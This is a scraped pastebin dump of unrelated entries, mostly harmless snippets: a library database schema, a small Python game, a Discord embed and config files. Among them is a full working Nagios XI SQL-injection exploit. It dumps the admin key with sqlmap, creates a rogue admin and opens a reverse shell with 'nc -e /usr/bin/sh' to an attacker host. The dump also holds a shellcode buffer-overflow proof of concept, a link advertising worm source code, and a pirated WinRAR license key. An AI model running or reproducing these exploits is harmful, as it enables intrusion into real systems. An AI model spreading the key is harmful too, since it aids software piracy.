id,title,username,language,date,content
V34UmHgJ,librarydb,Radoslav_03,MySQL,Wednesday 27th of March 2024 10:27:33 AM CDT,"DROP DATABASE IF EXISTS librarydb;
CREATE DATABASE librarydb;
USE librarydb;

CREATE TABLE userRole (
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    roleName ENUM (""Admin"", ""Librarian"", ""Student"", ""Teacher"") NOT NULL
);

CREATE TABLE users (
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR (100) NOT NULL,
    egn VARCHAR(10) NOT NULL UNIQUE,
    pass VARCHAR(100) NOT NULL,
    phone VARCHAR (10) NOT NULL UNIQUE,
    email VARCHAR (50) NOT NULL UNIQUE,
    role_id INT NOT NULL,
    
    CONSTRAINT FOREIGN KEY (role_id) REFERENCES userRole(id)
);

CREATE TABLE loanBooks (
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    date DATE NOT NULL,
    
    user_id INT NOT NULL,
    CONSTRAINT FOREIGN KEY (user_id) REFERENCES users(id)
);

CREATE TABLE publishers (
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    address VARCHAR(100) NOT NULL
);

CREATE TABLE books (
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    title VARCHAR(50) NOT NULL,
    description TEXT NOT NULL,
    
    user_id INT NOT NULL,
    loan_id INT NOT NULL,
    publisher_id INT NOT NULL,
    CONSTRAINT FOREIGN KEY (user_id) REFERENCES users(id),
    CONSTRAINT FOREIGN KEY (loan_id) REFERENCES loanBooks(id),
    CONSTRAINT FOREIGN KEY (publisher_id) REFERENCES publishers(id)
);

CREATE TABLE authors (
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    info TEXT NOT NULL
);

CREATE TABLE genres (
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(100) NOT NULL
);

CREATE TABLE books_authors(
	book_id INT NOT NULL,
    author_id INT NOT NULL,
    
	CONSTRAINT FOREIGN KEY (book_id) REFERENCES books(id),
    CONSTRAINT FOREIGN KEY (author_id) REFERENCES authors(id),
    PRIMARY KEY(book_id, author_id)
);

CREATE TABLE books_genres (
	book_id INT NOT NULL,
	genre_id INT NOT NULL,
    
    CONSTRAINT FOREIGN KEY (book_id) REFERENCES books(id),
    CONSTRAINT FOREIGN KEY (genre_id) REFERENCES genres(id),
    PRIMARY KEY(book_id, genre_id)
);

CREATE VIEW info AS
SELECT books.title, books.description, authors.name, genres.name, publishers.name
FROM books
JOIN books_authors ON books.id = books_authors.book_id
JOIN authors ON books_authors.author_id = authors.id
JOIN books_genres ON books.id = books_genres.book_id
JOIN genres ON books_genres.genre_id = genres.id
JOIN publishers ON books.publisher_id = publishers.id;

(SELECT books.title, publishers.name
FROM books
LEFT JOIN publishers ON books.publisher_id = publishers.id)
UNION
(SELECT books.title, publishers.name
FROM books
RIGHT JOIN publishers ON books.publisher_id = publishers.id);

SELECT a1.name AS author1_name, a2.name AS author2_name, b.title AS book_title
FROM books_authors ba1
JOIN books_authors ba2 ON ba1.book_id = ba2.book_id 
JOIN authors a1 ON ba1.author_id = a1.id
JOIN authors a2 ON ba2.author_id = a2.id
JOIN books b ON ba1.book_id = b.id
ORDER BY b.title;

"
246fsMxV,carl bot edit,EJ125,JSON,Wednesday 27th of March 2024 10:19:47 AM CDT,"{""fields"":
[{""name"":"""",""value"":"""",""inline"":false}],""title"":”roles"",""description"":""🏁 <@&885277018290282506>\n🤖 <@&816977059553083412>\n🗺️ <@&816977181984030740>\n🏃 <@&816976651199184916>\n\nYou can no longer self-assign any role by reacting. It is now required to ask a mod for any of the above roles. Note that to request the runner role you must have a verified run on the leaderboard. This is due to a recent increase in bot spam, and them using assigned roles to get passed verification requirements, Apologies for the inconvenience."",""color"":5198940}"
k3WcsYRt,Untitled,Roman9234,Python,Wednesday 27th of March 2024 10:07:45 AM CDT,"import arcade


class Ball(arcade.Sprite):
    def update(self):
        self.center_x += self.change_x
        if self.right > 800 or self.left < 0:
            self.change_x = - self.change_x
        self.center_y += self.change_y
        if self.bottom < 0 or self.top > 600:
            self.change_y = - self.change_y


class Paddle(arcade.Sprite):
    def update(self):
        self.center_x += self.change_x


class GameWindow(arcade.Window):
    # конструктор - вызывается при создании объекта
    def __init__(self, width, height, title):
        super().__init__(width, height, title)
        self.ball = Ball(""ping-pong/ball.png"", 0.1)
        self.paddle = Paddle(""ping-pong/plat.png"", 0.3)
    
    # начальные координаты    
    def setup(self):
        self.ball.center_x = 400
        self.ball.center_y = 300
        self.ball.change_x = 5
        self.ball.change_y = -3
        self.paddle.center_x = 400
        self.paddle.center_y = 100

    # отрисовка
    def on_draw(self):
        arcade.start_render()  # начало отрисовки
        arcade.set_background_color((107, 78, 135))
        self.ball.draw()
        self.paddle.draw()

    # смена кадров, игровая логика
    def on_update(self, delta_time: float):
        self.ball.update()
        self.paddle.update()


window = GameWindow(800, 600, ""Пинг-понг"")
window.setup()
arcade.run()  # запускает цикл обработки событий
"
4qy1p2Sh,GA4 - user_info - Generali,filipr27,JavaScript,Wednesday 27th of March 2024 10:06:43 AM CDT,"//Push this dataLayer event on every page before Google Tag Manager loads.

<script>
window.dataLayer = window.dataLayer || [];
window.dataLayer.push({
 'event': 'user_info',
 'user_id': '564363463456',  //Unique user ID of a registered user from the website's database.
 'login_status': 'logged in',  //If the user is logged in or not.
 });
</script>"
YEB83Bd1,26,nq1s788,Python,Wednesday 27th of March 2024 10:01:46 AM CDT,"data = open(""26_demo.txt"").readlines()
s, n = map(int, data[0].split())
a = list(map(int, data[1:]))
a.sort()
cur_sum = 0
first_answ = n
for i in range(n):
    cur_sum += a[i]
    if cur_sum > s:
        first_answ = i
        cur_sum -= a[i]
        break
print(first_answ)
if first_answ == n:
    print(a[-1])
    exit(0)
cur_sum -= a[first_answ - 1]
for i in range(n - 1, -1, -1):
    if cur_sum + a[i] <= s:
        print(a[i])
        break"
5QyQxHpB,Nagios XI Version 2024R1.01 - SQL Injection - CVE-2024-24401,FlyFar,Python,Wednesday 27th of March 2024 09:54:15 AM CDT,"# Exploit Title: NAGIOS XI SQLI
# Google Dork: [if applicable]
# Date: 02/26/2024
# Exploit Author: Jarod Jaslow (MAWK) https://www.linkedin.com/in/jarod-jaslow-codename-mawk-265144201/
# Vendor Homepage: https://www.nagios.com/changelog/#nagios-xi
# Software Link: https://github.com/MAWK0235/CVE-2024-24401
# Version: Nagios XI Version 2024R1.01
# Tested on: Nagios XI Version 2024R1.01 LINUX
# CVE : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-24401
#

import requests
import subprocess
import argparse
import re
import urllib3
import os
import random
import string
from colorama import Fore, Style

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



def serviceLogin(user,password):
    r = requests.post(f'http://{IP}/nagiosxi/api/v1/authenticate?pretty=1',data={'username':user,'password':password,""valid_min"":""5""},verify=False)  
    print(f""{Fore.MAGENTA}[+] Authenticating with captured credtials to API...."")
    match = re.search(r'auth_token"": ""(.*)""',r.text)
    if match:
        token = match.group(1)
        print(f'{Fore.MAGENTA}[+] Token: ' + token)
        r = requests.get(f'http://{IP}/nagiosxi/login.php?token={token}', verify=False)
        cookie = r.headers['Set-Cookie']
        cookie = cookie.split(',')[0]
        match = re.search(r'nagiosxi=(.*);', cookie)
        cookie = match.group(1)
        print(f""{Fore.MAGENTA}[+] Auth cookie is: "" + cookie)
        return cookie
    else:
        print(f'{Fore.RED}[-] Authentication Failed..{Style.RESET_ALL}')
        exit()

def sqlmap(IP,username,password):
    
    print(f'{Fore.MAGENTA}[+] Starting SQLMAP...')
    session = requests.session()
    s = session.get(f'http://{IP}/nagiosxi/index.php', verify=False)
    match = re.search(r'var nsp_str = \""(.*?)\""', s.text)
    nsp = match.group(1)
    print(f""{Fore.MAGENTA}[+] NSP captured: "" + nsp)
    data = {""nsp"": nsp, ""page"": ""auth"", ""debug"": '', ""pageopt"": ""login"", ""username"": username, ""password"": password, ""loginButton"": ''}
    s = session.post(f'http://{IP}/nagiosxi/login.php', data=data)
    print(f""{Fore.MAGENTA}[+] Authenticated as User.."")
    print(f""{Fore.MAGENTA}[+] Accepting license Agreement..."")
    s = session.get(f'http://{IP}/nagiosxi/login.php?showlicense', verify=False)
    match = re.search(r'var nsp_str = \""(.*?)\""', s.text)
    nsp = match.group(1)
    data = {""page"": ""/nagiosxi/login.php"", ""pageopt"": ""agreelicense"", ""nsp"": nsp, ""agree_license"": ""on""}
    session.post(f""http://{IP}/nagiosxi/login.php?showlicense"", data=data)
    print(f""{Fore.MAGENTA}[+] Performing mandatory password change ARGH"")
    newPass = ""mawk""
    data = {""page"": ""/nagiosxi/login.php"", ""pageopt"": ""changepass"", ""nsp"": nsp,""current_password"": password, ""password1"": newPass, ""password2"": newPass, ""reporttimesubmitbutton"": ''}
    session.post(f""http://{IP}/nagiosxi/login.php?forcepasswordchange"", data=data)
    s= session.get(f'http://{IP}/nagiosxi/')
    match = re.search(r'var nsp_str = \""(.*?)\""', s.text)
    nsp = match.group(1)
    cookie = s.cookies.get('nagiosxi')
    sqlmap_command = f'sqlmap --flush-session -u ""http://{IP}/nagiosxi//config/monitoringwizard.php/1*?update=1&nextstep=2&nsp={nsp}&wizard=mysqlserver"" --cookie=""nagiosxi={cookie}"" --dump -D nagiosxi -T xi_users --drop-set-cookie --technique=ET --dbms=MySQL -p id --risk=3 --level=5 --threads=10 --batch'
    #print(sqlmap_command)
    sqlmap_command_output = subprocess.Popen(sqlmap_command,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True )
    try:
        for line in iter(sqlmap_command_output.stdout.readline, ''):
            if ""| Nagios Administrator |"" in line:
                match = re.search(r""Nagios Administrator \| (.*?) \|"", line)
                if match:
                    adminKey= match.group(1)
                    print(f""{Fore.MAGENTA}[+] Admin Key recovered: "" + adminKey)
                    return adminKey
                else:
                    print(f""{Fore.RED}[-] Could not pull Admin Key :(....{Style.RESET_ALL}"")
                    exit()
                break
        print(""[-] SQLMAP capture FAILED.."")
        sqlmap_command_output.terminate()

    except KeyboardInterrupt:
        print(f""{Fore.RED}[-] SQLMAP interrupted. Cleaning up...{Style.RESET_ALL}"")
        sqlmap_command_output.terminate()
        sqlmap_command_output.communicate()
        exit()

def createAdmin(IP,adminKey):
    characters = string.ascii_letters + string.digits
    random_username = ''.join(random.choice(characters) for i in range(5))
    random_password = ''.join(random.choice(characters) for i in range(5))

    data = {""username"": random_username, ""password"": random_password, ""name"": random_username, ""email"": f""{random_username}@mail.com"", ""auth_level"": ""admin""}
    r = requests.post(f'http://{IP}/nagiosxi/api/v1/system/user?apikey={adminKey}&pretty=1', data=data, verify=False)
    if ""success"" in r.text:
        print(f'{Fore.MAGENTA}[+] Admin account created...')
        return random_username, random_password
    else:
        print(f'{Fore.RED}[-] Account Creation Failed!!! :(...{Style.RESET_ALL}')
        print(r.text)
        exit()

def start_HTTP_server():
    subprocess.Popen([""python"", ""-m"", ""http.server"", ""8000""], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def adminExploit(adminUsername, adminPassword, IP, LHOST,LPORT):
    print(f""{Fore.MAGENTA}[+] Conducting mandatory password change..."")
    session = requests.session()
    s = session.get(f'http://{IP}/nagiosxi/index.php', verify=False)
    match = re.search(r'var nsp_str = \""(.*?)\""', s.text)
    nsp = match.group(1)
    print(f""{Fore.MAGENTA}[+] NSP captured: "" + nsp)
    data = {""nsp"": nsp, ""page"": ""auth"", ""debug"": '', ""pageopt"": ""login"", ""username"": adminUsername, ""password"": adminPassword, ""loginButton"": ''}
    s = session.post(f'http://{IP}/nagiosxi/login.php', data=data)
    print(f""{Fore.MAGENTA}[+] Authenticated as admin.."")
    print(f""{Fore.MAGENTA}[+] Accepting license Agreement..."")
    s = session.get(f'http://{IP}/nagiosxi/login.php?showlicense', verify=False)
    match = re.search(r'var nsp_str = \""(.*?)\""', s.text)
    nsp = match.group(1)
    data = {""page"": ""/nagiosxi/login.php"", ""pageopt"": ""agreelicense"", ""nsp"": nsp, ""agree_license"": ""on""}
    session.post(f""http://{IP}/nagiosxi/login.php?showlicense"", data=data)
    print(f""{Fore.MAGENTA}[+] Performing mandatory password change ARGH"")
    newAdminPass = adminUsername + adminPassword
    data = {""page"": ""/nagiosxi/login.php"", ""pageopt"": ""changepass"",""current_password"": adminPassword, ""nsp"": nsp, ""password1"": newAdminPass, ""password2"": newAdminPass, ""reporttimesubmitbutton"": ''}
    session.post(f""http://{IP}/nagiosxi/login.php?forcepasswordchange"", data=data)
    print(f""{Fore.MAGENTA}[+] Creating new command..."")
    data = {""tfName"": adminUsername, ""tfCommand"": f""nc -e /usr/bin/sh {LHOST} {LPORT}"", ""selCommandType"": ""1"", ""chbActive"": ""1"", ""cmd"": ""submit"", ""mode"": ""insert"", ""hidId"": ""0"", ""hidName"": '', ""hidServiceDescription"": '', ""hostAddress"": ""127.0.0.1"", ""exactType"": ""command"", ""type"": ""command"", ""genericType"": ""command""}
    session.post(f'http://{IP}/nagiosxi/includes/components/ccm/index.php?type=command&page=1', data=data)
    data = {""cmd"": '', ""continue"": ''}
    start_HTTP_server()
    print(f""{Fore.MAGENTA}[+] Created command: "" + adminUsername)
    session.post(f'http://{IP}/nagiosxi/includes/components/nagioscorecfg/applyconfig.php?cmd=confirm', data=data)
    data = {""search"": adminUsername}
    s = session.post(f'http://{IP}/nagiosxi/includes/components/ccm/index.php?cmd=view&type=command&page=1', data=data)
    match = re.search(r""javascript:actionPic\('deactivate','(.*?)','"", s.text)
    if match:
        commandCID = match.group(1)
        print(f""{Fore.MAGENTA}[+] Captured Command CID: "" + commandCID)
        s = session.get(f""http://{IP}/nagiosxi/includes/components/ccm/?cmd=view&type=service"")
        match = re.search(r'var nsp_str = \""(.*?)\""', s.text)
        if match:
            nsp = match.group(1)
            s = session.get(f""http://{IP}/nagiosxi/includes/components/ccm/command_test.php?cmd=test&mode=test&cid={commandCID}&nsp={nsp}"")
            os.system(""kill -9 $(lsof -t -i:8000)"")
            print(f""{Fore.RED}[+] CHECK UR LISTENER"")
        else:
            print(f""{Fore.RED}[-] ERROR"")
    else:
        print(f""{Fore.RED}[-] Failed to capture Command CID..{Style.RESET_ALL}"")




if __name__ == '__main__':
    ascii_art = f""""""{Fore.LIGHTRED_EX}
███╗   ███╗ █████╗ ██╗    ██╗██╗  ██╗    ███████╗ ██████╗██████╗ ██╗██████╗ ████████╗███████╗
████╗ ████║██╔══██╗██║    ██║██║ ██╔╝    ██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝██╔════╝
██╔████╔██║███████║██║ █╗ ██║█████╔╝     ███████╗██║     ██████╔╝██║██████╔╝   ██║   ███████╗
██║╚██╔╝██║██╔══██║██║███╗██║██╔═██╗     ╚════██║██║     ██╔══██╗██║██╔═══╝    ██║   ╚════██║
██║ ╚═╝ ██║██║  ██║╚███╔███╔╝██║  ██╗    ███████║╚██████╗██║  ██║██║██║        ██║   ███████║
╚═╝     ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   ╚══════╝
     {Style.RESET_ALL}                                                                                      
    """"""
    print(ascii_art)
    parser = argparse.ArgumentParser(description=""AutoPwn Script for Bizness HTB machine"", usage= ""sudo Nagios.py <Target IP>  <LHOST> <LPORT>"")
    parser.add_argument('IP' ,help= ""Target IP "")
    parser.add_argument('LHOST',help= ""Local host"")
    parser.add_argument('LPORT' ,help= ""Listening Port"")

    args = parser.parse_args()
    min_required_args = 3
    if len(vars(args)) != min_required_args:
        parser.print_usage()
        exit()

    adminUsername, adminPassword = createAdmin(args.IP, sqlmap(args.IP,input(f""{Fore.MAGENTA}[+] Please insert a non-administrative username: ""),input(f""{Fore.MAGENTA}[+] Please insert the password: "")))
    print(f""{Fore.MAGENTA}[+] Admin Username="" + adminUsername)
    print(f""{Fore.MAGENTA}[+] Admin Password="" + adminPassword)
    adminExploit(adminUsername, adminPassword, args.IP,args.LHOST,args.LPORT)
            "
EaEBy2g1,Untitled,dllbridge,C,Wednesday 27th of March 2024 09:53:28 AM CDT,"

#include    <stdio.h>


int n = 4;

int *p = &n;

///////////////////////////////////////////////////
int main()                                       //
{
	printf(""*p = %d\n"", *p);
	printf("" p = %d\n"",  p);	
}






























 
/*
#include    <stdio.h>
#include   <stdlib.h>
#include     <time.h>  




///////////////////////////////////////////////////	
void foo(int *p)
{
    
    for(int i = 0; i < 20; i++)
    {
		printf(""nArr[%2d] = %4d \n"", i, p[i]);
	}
}
 	

///////////////////////////////////////////////////
int main()                                       //
{
 
    int  nArr[20] = {0, 0, 1000, 41};
  

 
    foo(&nArr[0]);

}



*/














/*

#include    <stdio.h>
#include   <stdlib.h>
#include     <time.h>  

	
    int  nArr[20],
         max = 0 ,
         min = 0 ;	

///////////////////////////////////////////////////
int main()                                       //
{

	srand(time(0));
		
	for(int i = 0; i < 20; i++)
	{
	   nArr[i] = (rand()%100) - 50;
	   printf (""nArr[%2d] = %3d \n"", i, nArr[i] );	
		
	   if(nArr[i] > max) max = nArr[i];	
	   if(nArr[i] < min) min = nArr[i];		   
	}	
	
	
	printf("" max = %3d\n"", max);	
	printf("" min = %3d\n"", min);

}
*/













/*

#include   <stdio.h>
  

float f1 = 5,
      f2; 
	

///////////////////////////////////////////////////
int main()                                       //
{
	
	f2 = f1 / 2;
	
	printf (""f2 = %.1f \n"", f2);
}





*/









/*

#include   <stdio.h>
  

int n1 = 5,
    n2; 
	

///////////////////////////////////////////////////
int main()                                       //
{
	
	n2 = n1 / 2;
	
	printf (""n2 = %d \n"", n2);
}


*/














/*
#include   <stdio.h>
  


	

///////////////////////////////////////////////////
int main()                                       //
{
	
    int  nArr[20],
         max = 0 ,
         min = 0 ;
	
	for(int i = 0; i < 20; i++)
	if(nArr[i]>max|| nArr[i]<min)
	{
	  	printf (""nArr[%2d]= %d \n"" ,i ,max);
	}
	{

	//	printf(""nArr[%2d] = %d  \n"", i, nArr[i]); 
		
	}
	
}

*/




/*

#include   <stdio.h>
  


	

///////////////////////////////////////////////////
int main()                                       //
{
	
    int  nArr[20],
         max = 0 ,
         min = nArr[0] ;
	
	for(int i = 0; i < 20; i++)
	{
		if(nArr[i] < min) min = nArr[i];
		printf(""nArr[%2d] = %d  \n"", i, nArr[i]); 
		
	}
	
	
	printf("" min = %d\n"", min);
	
}








*/








/*
#include   <stdio.h>
  




///////////////////////////////////////////////////
int main()                                       //
{
	
	int  n    =   4 ;
	int *p    =  &n ;

    printf("" n = %d  \n"",  n); 
    printf("" p = %d  \n"",  p);
    printf(""*p = %d  \n"", *p); 	
    printf(""&p = %d  \n"", &p);	 		
}



*/






"
Dn6Dvdcg,LBT-T300-mini1 - Remote Buffer Overflow,FlyFar,C++,Wednesday 27th of March 2024 09:51:15 AM CDT,"#include <stdio.h>
#include <string.h>

#define MAX_LEN 256
#define BUFFER_OVERRUN_LENGTH 50
#define SHELLCODE_LENGTH 32

// NOP sled to increase the chance of successful shellcode execution
char nop_sled[SHELLCODE_LENGTH] = ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"";

// Shellcode to execute /bin/sh
char shellcode[SHELLCODE_LENGTH] = ""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"";

void apply_cgi(char *vpn_client_ip) {
    char buffer[MAX_LEN];
    strncpy(buffer, vpn_client_ip, MAX_LEN);
    printf(""Client IP: %s\n"", buffer);
}

int main() {
    char input[MAX_LEN + BUFFER_OVERRUN_LENGTH] = {0};
    // Create a buffer with the malicious input
    // including the NOP sled, shellcode, and the overflow data
    int offset = strlen(nop_sled) + strlen(shellcode) - BUFFER_OVERRUN_LENGTH;
    strncpy(&input[0], nop_sled, offset);
    strncpy(&input[offset], shellcode, SHELLCODE_LENGTH);
    input[MAX_LEN + BUFFER_OVERRUN_LENGTH - 1] = '\x00';
    // Call the vulnerable function to trigger the buffer overflow
    apply_cgi(input);
    return 0;
}
            "
m8nup37Q,restart all syncs,globiws,PHP,Wednesday 27th of March 2024 09:51:13 AM CDT,"// restart all syncs

$org = 12345                          // insert your ORG ID
global $conn = ""connection-name""      // insert your mysql connection name as per the integrations page

global $refreshed = 0

doOrg($org)
print ""Refreshed ""+$refreshed+"" syncs""
end

function doOrg($org) {
	$spaces = podio_org_get_spaces($org)
	foreach ( $spaces as $space ) {
		if ( $space.type == ""emp_network"" ) continue
		ini_set(""max_execution_time"", 30)
		doSpace($space)
	}
}

function doSpace($space) {
	print ""Space: ""+$space.space_id+"": ""+$space.name
	$apps = podio_space_get_apps($space.space_id)
	foreach ( $apps as $app ) {
		ini_set(""max_execution_time"", 30)
		checkApp($app)
	}
}

function checkApp($app) {
	$appid = $app.app_id
	$sync = pf_sync_get_for_app(""p"", $appid)
	if ( $sync == false ) {
		return
	}
	print ""Restart sync ""+$sync.sync_id+"" for app ""+$appid+"": ""+$app.config.name
	$refreshed = $refreshed + 1
	pf_sync_restart($sync.sync_id)
}


"
K9VdS7ML,Untitled,soden,PHP,Wednesday 27th of March 2024 09:47:37 AM CDT,"@include('debugbar::render')
@include('debugbar::assets')
"
DjDeysVr,Untitled,soden,PHP,Wednesday 27th of March 2024 09:46:43 AM CDT,"\Debugbar::info($data);
"
e7mKvjN2,Untitled,soden,PHP,Wednesday 27th of March 2024 09:45:42 AM CDT,"'debugbar' => \Barryvdh\Debugbar\Middleware\Debugbar::class,
"
mvYKhiVD,Important Announcement,FlyFar,Email,Wednesday 27th of March 2024 09:45:08 AM CDT,"W32.Netsky.AE@mm Worm Source Code added
link: https://pastebin.com/u/FlyFar/1/jYbeFb1w"
tj5ijiwZ,config.env v1,G0nz0uk,YAML,Wednesday 27th of March 2024 09:45:05 AM CDT,"  echo ""DOMAIN=http://my.localgrafana.com:8080
  # Remove 'with_grafana' below if you want to use existing grafana
  # Add 'with_prometheus' below to optionally enable a local prometheus for oncall metrics
  COMPOSE_PROFILES=with_grafana,with_prometheus
  COMPOSE_PROFILES=with_grafana
  # to setup an auth token for prometheus exporter metrics:
  # PROMETHEUS_EXPORTER_SECRET=my_random_prometheus_secret
  # also, make sure to enable the /metrics endpoint:
  # FEATURE_PROMETHEUS_EXPORTER_ENABLED=True
  SECRET_KEY=""LnFUzDkciSfdfdfdfdfdfdfdfdfFiTeAPc6cAmrGGc"" > .env"
H5ufZ2x8,Untitled,soden,Bash,Wednesday 27th of March 2024 09:44:24 AM CDT,"composer require barryvdh/laravel-debugbar --dev
"
KPPmd7Ue,WinRAR Lifetime License Key By Kate Libby,katelibby,C++,Wednesday 27th of March 2024 09:04:45 AM CDT,"First, download Winrar from the official website: https://www.rarlab.com/download.htm.
After installing, run it once. then close it.
Now copy the following code into a text file and save it as ""rarreg.key"" on your desktop.
 
RAR registration data
WinRAR Official
Unlimited Company License
UID=764af7a365b9cc2800b9
641221225000b9159c62ab3736619039a6690a972a954ad239af05
07c1ac4383c129894fd560fce6cb5ffde62890079861be57638717
7131ced835ed65cc743d9777f2ea71a8e32c7e593cf66794343565
b41bcf56929486b8bcdac33d50ecf7739960e1a7f85e330ac24af0
cb11ed6fe8d15c22842718a50074ecf691e073d8bfdc0e4b6e9092
0c17f1f30844937f2ab000335773972ed5676439aec1fe5b601c96
6445f5a3abb8ee3b6e7f04533b5630222e65e0cae70d1245876275
 
Next, copy the rarreg.key file to your WinRAR installation directory.
 
Boom, WinRAR is activated."
